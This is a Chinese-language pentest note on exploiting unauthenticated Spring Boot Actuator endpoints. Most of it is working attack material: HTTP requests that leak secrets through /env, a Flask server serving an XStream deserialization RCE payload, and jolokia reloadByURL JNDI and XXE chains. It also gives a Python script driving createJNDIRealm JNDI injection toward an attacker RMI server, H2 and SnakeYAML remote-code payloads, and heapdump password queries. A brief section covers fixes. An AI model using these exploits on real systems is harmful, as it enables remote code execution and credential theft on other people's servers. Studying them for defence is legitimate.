---
title: "Spring Actuator未授权漏洞复现笔记"
slug: mn1b2c
translationKey: mn1b2c
date: 2021-07-07T16:51:03+08:00
source: yuque/penetration
---

# 〇、背景
Actuator 端点允许您监视应用程序并与之交互。Spring Boot 包含许多内置端点，您也可以添加自己的端点。例如， health端点提供基本的应用程序健康信息。

[dirsearch](https://github.com/maurosoria/dirsearch)中支持对Actuator 端点的扫描。

# 一、漏洞检测
## SpringBoot识别
+ `/error`，<font style="color:rgb(0, 0, 0);">There was an unexpected error (type=None, status=</font>`<font style="color:rgb(0, 0, 0);">999</font>`<font style="color:rgb(0, 0, 0);">).</font>
+ `/resume`，<font style="color:rgb(0, 0, 0);">There was an unexpected error (type=Method Not Allowed, status=</font>`<font style="color:rgb(0, 0, 0);">405</font>`<font style="color:rgb(0, 0, 0);">).</font>

对于Spring 1x，它们在 `/` 下注册；在2x中，它们移动到 `/actuator/` 基本路径。



## Actuator识别
参考[https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629096120831-23eeedbd-e3a7-445c-a213-4590bde1d577.png)

重要的路由

```basic
spring boot 常见的功能
/dump - 显示线程转储（包括堆栈跟踪）
/autoconfig - 显示自动配置报告
/configprops - 显示配置属性
/trace - 显示最后几条HTTP消息（可能包含会话标识符）
/logfile - 输出日志文件的内容
/shutdown - 关闭应用程序
/info - 显示应用信息
/metrics - 显示当前应用的’指标’信息
/health - 显示应用程序的健康指标
/beans - 显示Spring Beans的完整列表
/mappings - 显示所有MVC控制器映射
/env - 提供对配置环境的访问
/restart - 重新启动应用程序
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629096928657-ef7d2d52-791d-491b-8a99-6d7a861fd49b.png)

---

# 二、漏洞利用
## 0x01 /env导致信息泄露
全局搜索`password`、`pwd`

**通过**`**${name}**`** 可以获取明文字段**

例如，对于`gitPassword`变量，通过发以下包，然后 post refresh 任意内容，可获取对应信息（basic认证获取密码）

```markdown
POST /env HTTP/1.1
Host: 0.0.0.0(实际ip或host地址)
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

eureka.client.serviceUrl.defaultZone=http://${gitPassword}@0.0.0.0:8080
```

Ps: 一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少`spring-boot-starter-actuator`扩展包无法刷新漏洞则无法利用

**无需VPS的小技巧**

在`/env`、`/trace`同时可用的情况下，可以往本地打`POST`请求，通过/trace来泄露密码。

比方说我actuctor开在8090端口，那么就POST `${PID}`到本地

```markdown
POST /env HTTP/1.1
Host: actuator:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

eureka.client.serviceUrl.defaultZone=http://${PID}@127.0.0.1:8090/poc/${PID}
```

接着，去`/env`下寻找明文值就行啦！

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629100966860-b02a5385-235d-4117-8300-d3f9a90e0ec2.png)

## 0x02 Eureka-Client <1.8.7 XStream反序列化漏洞
**注意：**此漏洞会覆写远程主机的配置，建议先保存原本的`defaultZone`，漏洞利用完毕之后，再改回去，否则可能会导致服务崩溃。

+ `/configprops`  中存在`defaultZone`字段
+ `/health`中存在`Eureka`字段



漏洞利用脚本（Windows）

```markdown
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
	xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                  <string>cmd</string>
                  <string>/c</string>
                  <string>calc.exe</string>
                  </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
	return Response(xml, mimetype='application/xml')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8)
```

注意在`<string>`里面放要执行的命令。实测下面这种payload在Windows上也可

+ `<string>cmd /c calc.exe</string>`



首先，允许上面的Py脚本，把漏洞利用的vps起起来

①POST /env

```markdown
POST /env HTTP/1.1
Host: actuator:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

eureka.client.serviceUrl.defaultZone=http://127.0.0.1:8/
```



②POST /refresh

```markdown
POST /refresh HTTP/1.1
Host: actuator:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

③恢复原本的`defaultZone`



另外还有一些小细节：对于Spring 2.x，需要采用JSON的`Content-Type`

```markdown
POST /actuator/env HTTP/1.1
Host: actuator:8090
Content-Type: application/json
Content-Length: 0

{"name":"eureka.client.serviceUrl.defaultZone", "value":"http://0.0.0.0:8/"}
```

同理，POST refresh也需设置`Content-Type: application/json`

## 0x03 /jolokia reloadByURL 漏洞
> Logback库提供的“ `reloadByURL`”操作，允许我们从外部URL重新加载日志记录配置
>

+ `/jolokia/list` 中，存在`reloadByURL`值



### PoC
Get

```xml
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/[DNSLOG]!/logback.xml
```

Receive

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629107472607-7b9a9e61-f596-4a7d-8ad9-e32a857a14e2.png)

里面有jdk版本信息。当然，你知道，这种方式支持DnsLog



### JNDI=>RCE
HTTP Server，放置`logback.xml`，内容如下

```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://[ip]:[port]/1u4fif" as="appName" />
</configuration>
```

再搭建一个恶意RMI服务器，起在1099端口

（可以使用`JNDI-Injection-Exploit`搭建恶意RMI服务）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629106836267-af66c6ee-a7a4-45a0-8061-0946589b89cb.png)

最后向Actuactor请求一下就好了

```http
GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/[http.server]!/logback.xml HTTP/1.1
Host: actuator:8090

```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629107231159-48f46f00-688e-482b-be40-9a46a525502d.png)

### XXE
在`/jolokia/list`目录下，存在logback组件，则可以使用jolokia远程包含logback.xml配置文件，造成blind XXE。

```markdown
GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8!/logback.xml HTTP/1.1
Host: actuator:8090

```

企图利用XXE来DoS，是会失败的，JDK做了限制。。。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629102339970-72857811-3830-44af-98b4-5c863dab58ac.png)



## 0x04 /jolokia createJNDIRealm 反序列
+ `/jolokia/list`中，存在`createJNDIRealm`
+ 目标站点开启了 `jolokia` 端点且存在`createJNDIRealm`方法，可进行JNDI注入RCE测试

一共需要5步，

1. 创建 JNDIRealm
2. 写入 contextFactory 为 RegistryContextFactory
3. 写入 connectionURL 为你的 RMI Service URL
4. 停止 Realm
5. 启动 Realm 以触发 JNDI 注入

都整合到下面的脚本中啦！

依旧是先搭建恶意的RMI服务器（可以使用`JNDI-Injection-Exploit`），接着更改下面的payload

```xml
import requests as req
import sys
from pprint import pprint
import json
import ssl
import  urllib3
import hashlib
urllib3.disable_warnings()
ssl._create_default_https_context = ssl._create_unverified_context
 
#### Payload ####
URL = "http://actuator:8090/" + "/jolokia/"
RMI_SERVER = "rmi://[vps]:1099/uqeu9k"

#创建JNDIRealm
create_JNDIrealm ={"mbean": "Tomcat:type=MBeanFactory","type": "EXEC","operation": "createJNDIRealm","arguments": ["Tomcat:type=Engine"]}

#写入contextFactory
set_contextFactory ={"mbean": "Tomcat:realmPath=/realm0,type=Realm","type": "WRITE","attribute": "contextFactory","value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

#写入connectionURL为自己公网RMI service地址
set_connectionURL = {"mbean": "Tomcat:realmPath=/realm0,type=Realm","type": "WRITE","attribute": "connectionURL","value": RMI_SERVER}

#停止Realm
stop_JNDIrealm = {"mbean": "Tomcat:realmPath=/realm0,type=Realm","type": "EXEC","operation": "stop","arguments": []}

#运行Realm，触发JNDI 注入
start = {"mbean": "Tomcat:realmPath=/realm0,type=Realm","type": "EXEC","operation": "start","arguments": []}
 
EXPs = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]
 
for i in EXPs:
    rep = req.post(URL, json=i)
    print(rep.text)

print("Done!")
```

允许脚本即可RCE！好像没有看到副作用...



## 0x05 H2 RCE
> Spring Boot 2.x版本存在H2配置不当导致的RCE
>

+ GET /actuator/restart 的状态码为 405 
+ POST /actuator/restart 的状态码为 415（不指定`Content-Type`）

利用过程

1

```sql
POST /actuator/env HTTP/1.1
Host: actuator:8080
Content-Type: application/json
Content-Length: 348

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('cmd /c calc.exe');"}
```

2 

```sql
POST /actuator/restart HTTP/1.1
Host: actuator:8080
Content-Type: application/json
Content-Length: 0

```

会把服务打挂（慎用！！！）



## 0x06 SnakeYAML RCE
> 拉取漏洞环境（repository/springcloud-snakeyaml-rce），运行环境，推荐在docker下运行。
>

首先，创建`payload.yml`文件，放置到Web目录下

```sql
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:88/payload.jar"]
  ]]
]
```

其次，拷贝 [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) 仓库到本地，修改src/artsploit/AwesomeScriptEngineFactory.java中要执行的命令，如图所示

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629367300936-71dc9422-fd83-4e91-a681-93242d5464d9.png)

接着，`POST /env` 更新

```sql
POST /env HTTP/1.1
Host: actuator:9092
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

spring.cloud.bootstrap.location=http://127.0.0.1:88/payload.yml
```

更新refresh接口

```sql
POST /refresh HTTP/1.1
Host: actuator:9092
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

## 0x07 /heapdump
当下载`/heapdump`是403的时候, /heapdump.json可以下载成功

 Eclipse Memory Analyzer :[https://www.eclipse.org/mat/downloads.php](https://www.eclipse.org/mat/downloads.php)



打开工具file->open heap dump选择下载下来的文件，点击 OQL 标签，在查询框中输入，选择红色感叹号执行SQL语句

+ spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 `java.util.Hashtable$Entry` 实例的键值

```sql
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
```

+ spring boot 2.x 版本 heapdump 查询结果，最终结果存储在` java.util.LinkedHashMap$Entry `实例的键值对中，本文测试的是springboot 2.x版本，配合env信息进行搜索

```sql
select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))
```

---

# 三、漏洞修复
## 0x01 添加认证
先在`pom.xml`中，添加依赖

```sql
<dependency>
	<groupId>org.springframework.boot</groupId>
	<artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

接着，在`application.properties`里面配置账号、密码

```sql
management.security.enabled=true
security.user.name=admin
security.user.password=admin123
```

配置后，除了`/info`外，`/*`均需要basic认证才能访问，如[http://actuator:8090/env](http://actuator:8090/env)，会影响正常的使用~

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629369661653-d1b6b41c-3634-48b0-b93b-126bd2b2dda6.png)

## 0x02 禁用接口（推荐）
第一种，可以禁用全部接口。

在`application.properties`中配置

```sql
endpoints.enabled = false
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629370364997-e37a7418-01b2-461b-bba4-74afb80b992a.png)

第二种，禁用部分接口

同样在`application.properties`中配置

> ①先禁用全部
>
> ②再开放部分接口
>

```sql
endpoints.enabled = false
endpoints.metrics.enabled = true
endpoints.health.enabled = true
```

效果就是这样的

访问`/metrics`，`/healt`h是ok的

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629370517368-3c5ccc32-f0b4-4b0e-88b6-adcc7629e5a4.png)

访问`/env`的话，同样不行

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629370604962-fe908b4a-f863-43a5-a1f0-c83f891258b5.png)

# Refs
+ [https://github.com/veracode-research/actuator-testbed](https://github.com/veracode-research/actuator-testbed)
+ [https://github.com/jas502n/SpringBoot_Actuator_RCE](https://github.com/jas502n/SpringBoot_Actuator_RCE)
+ [https://github.com/ananaskr/springboot_actuator](https://github.com/ananaskr/springboot_actuator)
+ [https://www.cnblogs.com/websecyw/p/14588407.html](https://www.cnblogs.com/websecyw/p/14588407.html)
+ [https://www.jianshu.com/p/8c18f1e05c94](https://www.jianshu.com/p/8c18f1e05c94)
+ [https://github.com/LandGrey/SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)

